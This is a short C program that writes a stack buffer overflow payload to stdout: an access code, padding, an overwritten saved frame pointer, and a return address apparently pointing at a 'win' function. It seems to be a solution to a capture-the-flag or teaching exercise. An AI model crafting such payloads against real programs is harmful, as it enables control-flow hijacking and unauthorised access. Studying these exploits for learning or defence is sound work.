#include <stdio.h>
#include <stdlib.h>

/**
 * Print exactly n characters from s to stdout, regardless if they are
 * printable.
 */
void print_bytes(char const *s, size_t n);

int main(void)
{
    char access_code[16] = "Sup3rs3cr3tC0de";
    char padding[32];
    char rbp[8] = "\x90\xde\xff\xff\xff\x7f\x00\x00";
    char win[8] = "\x72\x11\x40\x00\x00\x00\x00\x00";

    print_bytes(access_code, sizeof(access_code));
    print_bytes(padding, sizeof(padding));
    print_bytes(rbp, sizeof(rbp));
    print_bytes(win, sizeof(win));
    fputc('\n', stdout);

    return EXIT_SUCCESS;
}

void print_bytes(char const *s, size_t n)
{
    size_t i;

    for (i = 0; i < n; i++)
        fputc(s[i], stdout);
}
